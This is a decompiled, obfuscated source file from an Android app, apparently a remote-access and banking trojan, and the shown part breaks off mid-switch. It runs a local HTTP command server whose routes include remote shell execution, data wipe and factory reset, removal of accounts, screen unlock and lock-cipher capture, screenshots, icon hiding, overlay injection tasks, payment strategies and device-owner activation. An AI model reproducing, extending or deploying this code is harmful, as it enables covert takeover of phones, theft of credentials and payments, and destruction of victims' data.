package com.storm.safe.rock.service.modules;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import com.storm.safe.rock.AppVariantA;
import com.storm.safe.rock.AppVariantB;
import com.storm.safe.rock.AppVariantC;
import com.storm.safe.rock.AppVariantD;
import com.storm.safe.rock.AppVariantE;
import com.storm.safe.rock.AppVariantF;
import com.storm.safe.rock.AppVariantG;
import com.storm.safe.rock.AppVariantH;
import com.storm.safe.rock.AppVariantI;
import com.storm.safe.rock.AppVariantJ;
import com.storm.safe.rock.AppVariantK;
import com.storm.safe.rock.AppVariantL;
import com.storm.safe.rock.AppVariantN;
import com.storm.safe.rock.DefaultLauncherAlias;
import com.storm.safe.rock.inject.jbqfkndyx;
import com.storm.safe.rock.receiver.zbrefryi;
import com.storm.safe.rock.service.account.C0287a0;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.service.modules.command.C0350a7;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import org.conscrypt.FileClientSessionCache;
import org.json.HTTP;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0577hd;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.ac0;
import p000.kg1;
import p000.m10;
import p000.m21;
import p000.oe0;
import p000.t60;
import p000.v10;
import p000.yj1;
import p000.zb0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a7 */
/* loaded from: classes2.dex */
public final class C0322a7 {

    /* renamed from: a9 */
    public static final ac0 f53085a9 = new ac0(null);

    /* renamed from: b0 */
    public static volatile int f53086b0 = 7910;

    /* renamed from: b1 */
    public static volatile C0322a7 f53087b1;

    /* renamed from: a0 */
    public final dqtvuisjd f53088a0;

    /* renamed from: a1 */
    public ServerSocket f53089a1;

    /* renamed from: a2 */
    public ExecutorService f53090a2;

    /* renamed from: a4 */
    public Thread f53092a4;

    /* renamed from: a5 */
    public C0350a7 f53093a5;

    /* renamed from: a8 */
    public volatile int f53096a8;

    /* renamed from: a3 */
    public final AtomicBoolean f53091a3 = new AtomicBoolean(false);

    /* renamed from: a6 */
    public final LinkedHashMap f53094a6 = new LinkedHashMap();

    /* renamed from: a7 */
    public final Handler f53095a7 = new Handler(Looper.getMainLooper());

    public C0322a7(dqtvuisjd dqtvuisjdVar) {
        this.f53088a0 = dqtvuisjdVar;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:318:0x0547, code lost:
    
        if (r11 == r3) goto L319;
     */
    /* JADX WARN: Removed duplicated region for block: B:317:0x053b A[Catch: Exception -> 0x0036, TryCatch #1 {Exception -> 0x0036, blocks: (B:13:0x0031, B:320:0x054a, B:18:0x003d, B:182:0x02ae, B:21:0x0046, B:278:0x046d, B:24:0x004f, B:197:0x02ed, B:27:0x0058, B:312:0x0524, B:30:0x0061, B:239:0x03ba, B:33:0x006a, B:301:0x04e1, B:36:0x0073, B:74:0x00f7, B:39:0x007c, B:132:0x01dd, B:42:0x0085, B:175:0x028f, B:45:0x008e, B:216:0x033b, B:48:0x0097, B:125:0x01bf, B:51:0x009f, B:55:0x00ac, B:58:0x00b6, B:59:0x00bc, B:67:0x00d8, B:68:0x00de, B:71:0x00e8, B:76:0x00fd, B:79:0x0107, B:80:0x010d, B:83:0x0117, B:84:0x011d, B:87:0x0127, B:88:0x012d, B:91:0x0137, B:92:0x013d, B:95:0x0147, B:96:0x014d, B:99:0x0157, B:100:0x015d, B:103:0x0167, B:104:0x016d, B:220:0x034a, B:107:0x0177, B:110:0x0181, B:111:0x0187, B:114:0x0191, B:115:0x0197, B:118:0x01a1, B:119:0x01a7, B:122:0x01b1, B:126:0x01c4, B:129:0x01ce, B:133:0x01e2, B:136:0x01ec, B:137:0x01f2, B:140:0x01fc, B:141:0x0202, B:144:0x020c, B:145:0x0212, B:148:0x021c, B:149:0x0222, B:152:0x022c, B:153:0x0232, B:156:0x023c, B:157:0x0242, B:160:0x024c, B:161:0x0256, B:164:0x0260, B:165:0x0266, B:168:0x0270, B:169:0x0276, B:172:0x0280, B:176:0x0294, B:179:0x029e, B:183:0x02b3, B:186:0x02bd, B:187:0x02c3, B:190:0x02cd, B:191:0x02d3, B:194:0x02dd, B:198:0x02f2, B:201:0x02fc, B:202:0x0302, B:205:0x030c, B:206:0x0312, B:209:0x031c, B:210:0x0322, B:213:0x032c, B:217:0x0340, B:221:0x035e, B:224:0x0368, B:225:0x036e, B:228:0x0378, B:229:0x037e, B:232:0x0388, B:233:0x038e, B:236:0x0398, B:240:0x03bf, B:243:0x03c9, B:244:0x03cf, B:247:0x03d9, B:248:0x03df, B:251:0x03e9, B:252:0x03ef, B:255:0x03f9, B:256:0x03ff, B:259:0x0409, B:260:0x040f, B:263:0x0419, B:264:0x041f, B:267:0x0429, B:268:0x042f, B:271:0x0439, B:272:0x043f, B:275:0x0449, B:279:0x0472, B:282:0x047c, B:283:0x0482, B:286:0x048c, B:287:0x0492, B:290:0x049c, B:291:0x04a2, B:294:0x04ac, B:295:0x04b2, B:298:0x04bc, B:302:0x04e6, B:305:0x04ef, B:306:0x04f5, B:309:0x04fe, B:313:0x0529, B:322:0x0558, B:315:0x0531, B:317:0x053b, B:321:0x054f), top: B:329:0x0022 }] */
    /* JADX WARN: Removed duplicated region for block: B:321:0x054f A[Catch: Exception -> 0x0036, TryCatch #1 {Exception -> 0x0036, blocks: (B:13:0x0031, B:320:0x054a, B:18:0x003d, B:182:0x02ae, B:21:0x0046, B:278:0x046d, B:24:0x004f, B:197:0x02ed, B:27:0x0058, B:312:0x0524, B:30:0x0061, B:239:0x03ba, B:33:0x006a, B:301:0x04e1, B:36:0x0073, B:74:0x00f7, B:39:0x007c, B:132:0x01dd, B:42:0x0085, B:175:0x028f, B:45:0x008e, B:216:0x033b, B:48:0x0097, B:125:0x01bf, B:51:0x009f, B:55:0x00ac, B:58:0x00b6, B:59:0x00bc, B:67:0x00d8, B:68:0x00de, B:71:0x00e8, B:76:0x00fd, B:79:0x0107, B:80:0x010d, B:83:0x0117, B:84:0x011d, B:87:0x0127, B:88:0x012d, B:91:0x0137, B:92:0x013d, B:95:0x0147, B:96:0x014d, B:99:0x0157, B:100:0x015d, B:103:0x0167, B:104:0x016d, B:220:0x034a, B:107:0x0177, B:110:0x0181, B:111:0x0187, B:114:0x0191, B:115:0x0197, B:118:0x01a1, B:119:0x01a7, B:122:0x01b1, B:126:0x01c4, B:129:0x01ce, B:133:0x01e2, B:136:0x01ec, B:137:0x01f2, B:140:0x01fc, B:141:0x0202, B:144:0x020c, B:145:0x0212, B:148:0x021c, B:149:0x0222, B:152:0x022c, B:153:0x0232, B:156:0x023c, B:157:0x0242, B:160:0x024c, B:161:0x0256, B:164:0x0260, B:165:0x0266, B:168:0x0270, B:169:0x0276, B:172:0x0280, B:176:0x0294, B:179:0x029e, B:183:0x02b3, B:186:0x02bd, B:187:0x02c3, B:190:0x02cd, B:191:0x02d3, B:194:0x02dd, B:198:0x02f2, B:201:0x02fc, B:202:0x0302, B:205:0x030c, B:206:0x0312, B:209:0x031c, B:210:0x0322, B:213:0x032c, B:217:0x0340, B:221:0x035e, B:224:0x0368, B:225:0x036e, B:228:0x0378, B:229:0x037e, B:232:0x0388, B:233:0x038e, B:236:0x0398, B:240:0x03bf, B:243:0x03c9, B:244:0x03cf, B:247:0x03d9, B:248:0x03df, B:251:0x03e9, B:252:0x03ef, B:255:0x03f9, B:256:0x03ff, B:259:0x0409, B:260:0x040f, B:263:0x0419, B:264:0x041f, B:267:0x0429, B:268:0x042f, B:271:0x0439, B:272:0x043f, B:275:0x0449, B:279:0x0472, B:282:0x047c, B:283:0x0482, B:286:0x048c, B:287:0x0492, B:290:0x049c, B:291:0x04a2, B:294:0x04ac, B:295:0x04b2, B:298:0x04bc, B:302:0x04e6, B:305:0x04ef, B:306:0x04f5, B:309:0x04fe, B:313:0x0529, B:322:0x0558, B:315:0x0531, B:317:0x053b, B:321:0x054f), top: B:329:0x0022 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211584a0(C0322a7 c0322a7, String str, Map map, String str2, ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$routeRequest$1 localHttpServer$routeRequest$1;
        m10 m10Var;
        JSONObject jSONObject;
        if (continuationImpl instanceof LocalHttpServer$routeRequest$1) {
            localHttpServer$routeRequest$1 = (LocalHttpServer$routeRequest$1) continuationImpl;
            int i = localHttpServer$routeRequest$1.f52822a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$routeRequest$1.f52822a4 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$routeRequest$1 = new LocalHttpServer$routeRequest$1(c0322a7, continuationImpl);
            }
        }
        Object objMo211537a1 = localHttpServer$routeRequest$1.f52820a2;
        Object obj = CoroutineSingletons.f57606a0;
        try {
            switch (localHttpServer$routeRequest$1.f52822a4) {
                case 0:
                    kg1.m213544f4(objMo211537a1);
                    switch (str.hashCode()) {
                        case -2140093722:
                            if (str.equals("/injectionTasks")) {
                                return m211590c1();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                                return m211585a1("未知路由: ".concat(str));
                            }
                            localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                            localHttpServer$routeRequest$1.f52819a1 = str;
                            localHttpServer$routeRequest$1.f52822a4 = 12;
                            objMo211537a1 = m10Var.mo211537a1(map, str2, localHttpServer$routeRequest$1);
                            break;
                        case -2077441997:
                            if (str.equals("/unlock")) {
                                Map mapM213615g0 = AbstractC0770a1.m213615g0(AbstractC0770a1.m213613f8(new Pair(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("Hnc9FW4TMwpyBwJ6NA=="))), map);
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 8;
                                objMo211537a1 = c0322a7.m211597a2(mapM213615g0, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -2065627613:
                            if (str.equals("/netState")) {
                                return c0322a7.m211604b1();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -2029212786:
                            if (str.equals("/startApp")) {
                                Map mapM213615g02 = AbstractC0770a1.m213615g0(AbstractC0770a1.m213613f8(new Pair(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("B3gkFG4QMw9nAQ=="))), map);
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 6;
                                objMo211537a1 = c0322a7.m211597a2(mapM213615g02, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1989636578:
                            if (str.equals("/writeAccessibility")) {
                                return c0322a7.m211630e2(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1921988090:
                            if (str.equals("/activeDevelopment")) {
                                return c0322a7.m211626d8(true);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1800588370:
                            if (str.equals("/closeInjection")) {
                                return m211589b8();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1794582003:
                            if (str.equals("/disableAccountProtection")) {
                                return c0322a7.m211610b9();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1678771338:
                            if (str.equals("/screenshot/0")) {
                                Map mapM213613f8 = AbstractC0770a1.m213613f8(new Pair(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("GHojH2gWMw12AR9sIx9yCikdYhwO")));
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 10;
                                objMo211537a1 = c0322a7.m211597a2(mapM213613f8, null, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1604449475:
                            if (str.equals("/closeADBDebug")) {
                                return c0322a7.m211625d7(false);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1587259689:
                            if (str.equals("/lockState")) {
                                return c0322a7.m211603b0();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -1314934145:
                            if (str.equals("/containerState")) {
                                return m211586a7();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -911002495:
                            if (str.equals("/visibility")) {
                                return c0322a7.m211612c2();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -825262582:
                            if (str.equals("/hideIcon")) {
                                return c0322a7.m211612c2();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -708640823:
                            if (str.equals("/activeWifiDebug")) {
                                return c0322a7.m211627d9(true);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -637191159:
                            if (str.equals("/activeADBDebug")) {
                                return c0322a7.m211625d7(true);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -628877547:
                            if (str.equals("/closeWifiDebug")) {
                                return c0322a7.m211627d9(false);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -404562220:
                            if (str.equals("/killApp")) {
                                Map mapM213615g03 = AbstractC0770a1.m213615g0(AbstractC0770a1.m213613f8(new Pair(StringUtil.m212470a0("KFYcN0w2CA=="), "KILL_APP")), map);
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 7;
                                objMo211537a1 = c0322a7.m211597a2(mapM213615g03, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -355540480:
                            if (str.equals("/adbShell")) {
                                return m211588b5(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -109512256:
                            if (str.equals("/wipeData")) {
                                return c0322a7.m211629e1(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case -52146071:
                            if (str.equals("/mainPackageName")) {
                                return c0322a7.m211615c5(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 47:
                            if (!str.equals("/")) {
                                m10Var = (m10) c0322a7.f53094a6.get(str);
                                if (m10Var == null) {
                                }
                            }
                            return m211596e8("LocalHttpServer running on port " + f53086b0);
                        case 46532928:
                            if (str.equals("/exec")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 2;
                                objMo211537a1 = c0322a7.m211597a2(map, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 118400594:
                            if (str.equals("/accessibilityState")) {
                                return c0322a7.m211601a6();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 119446887:
                            if (str.equals("/pauseAccessibility")) {
                                return m211591c8(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 200857354:
                            if (str.equals("/deviceAdmin")) {
                                return c0322a7.m211602a8();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 226306435:
                            if (str.equals("/blockView")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 9;
                                objMo211537a1 = c0322a7.m211608b6(map, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 253894084:
                            if (str.equals("/stopAdminActive")) {
                                return c0322a7.m211623d5();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 443539764:
                            if (str.equals("/removeAllAccounts")) {
                                return c0322a7.m211618c9();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 525517989:
                            if (str.equals("/uninstallPolicy")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 11;
                                objMo211537a1 = c0322a7.m211628e0(map, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 587829843:
                            if (str.equals("/global/action")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 3;
                                objMo211537a1 = c0322a7.m211598a3(map, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 609822277:
                            if (str.equals("/showIcon")) {
                                return c0322a7.m211620d2();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 616037888:
                            if (str.equals("/syncLockCipher")) {
                                return c0322a7.m211624d6(str2, map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 659315145:
                            if (str.equals("/version")) {
                                return m211596e8(c0322a7.m211606b3());
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 945146682:
                            if (str.equals("/iconStatus")) {
                                return c0322a7.m211614c4();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 996274731:
                            if (str.equals("/browserApps")) {
                                return c0322a7.m211609b7();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1040225992:
                            if (str.equals("/activeDeviceOwner")) {
                                return c0322a7.m211607b4();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1061221702:
                            if (str.equals("/noticeAlive")) {
                                return c0322a7.m211616c6();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1095223396:
                            if (str.equals("/setPaymentStrategies")) {
                                return c0322a7.m211619d1(str2);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1237707682:
                            if (str.equals("/startAdminActive")) {
                                return c0322a7.m211622d4();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1250583316:
                            if (str.equals("/global/lockScreen")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 4;
                                objMo211537a1 = c0322a7.m211599a4(localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1258101820:
                            if (str.equals("/command")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 1;
                                objMo211537a1 = c0322a7.m211597a2(map, str2, localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1337345917:
                            if (str.equals("/openWriteSecure")) {
                                return c0322a7.m211617c7();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1405226879:
                            if (str.equals("/restore")) {
                                return c0322a7.m211629e1(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1441028996:
                            if (str.equals("/debug")) {
                                return m211588b5(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1445916163:
                            if (!str.equals("/index")) {
                                m10Var = (m10) c0322a7.f53094a6.get(str);
                                if (m10Var == null) {
                                }
                            }
                            return m211596e8("LocalHttpServer running on port " + f53086b0);
                        case 1453974144:
                            if (str.equals("/reset")) {
                                return c0322a7.m211629e1(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1454973793:
                            if (str.equals("/shell")) {
                                return m211588b5(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1497187348:
                            if (str.equals("/factoryReset")) {
                                return c0322a7.m211629e1(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1517623444:
                            if (str.equals("/enableAccountProtection")) {
                                return c0322a7.m211611c0();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1571327627:
                            if (str.equals("/showInjection")) {
                                return c0322a7.m211621d3(str2, map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1716076114:
                            if (str.equals("/closeDevelopment")) {
                                return c0322a7.m211626d8(false);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1717752822:
                            if (str.equals("/screenState")) {
                                return c0322a7.m211605b2();
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 1959130888:
                            if (str.equals("/global/wakeUpScreen")) {
                                localHttpServer$routeRequest$1.f52818a0 = c0322a7;
                                localHttpServer$routeRequest$1.f52819a1 = str;
                                localHttpServer$routeRequest$1.f52822a4 = 5;
                                objMo211537a1 = c0322a7.m211600a5(localHttpServer$routeRequest$1);
                                if (objMo211537a1 == obj) {
                                    return obj;
                                }
                                jSONObject = (JSONObject) objMo211537a1;
                                return jSONObject;
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 2058177344:
                            if (str.equals("/deviceId")) {
                                String str3 = "unknown";
                                try {
                                    String string = Settings.Secure.getString(c0322a7.f53088a0.getContentResolver(), "android_id");
                                    if (string != null) {
                                        str3 = string;
                                    }
                                } catch (Exception unused) {
                                }
                                return m211596e8(str3);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        case 2146760082:
                            if (str.equals("/resumeAccessibility")) {
                                return m211592d0(map);
                            }
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                        default:
                            m10Var = (m10) c0322a7.f53094a6.get(str);
                            if (m10Var == null) {
                            }
                            break;
                    }
                case 1:
                    String str4 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a72 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 2:
                    String str5 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a73 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 3:
                    String str6 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a74 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 4:
                    String str7 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a75 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 5:
                    String str8 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a76 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 6:
                    String str9 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a77 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 7:
                    String str10 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a78 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 8:
                    String str11 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a79 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 9:
                    String str12 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a710 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case 10:
                    String str13 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a711 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                case oe0.DEFAULT_M /* 11 */:
                    String str14 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a712 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
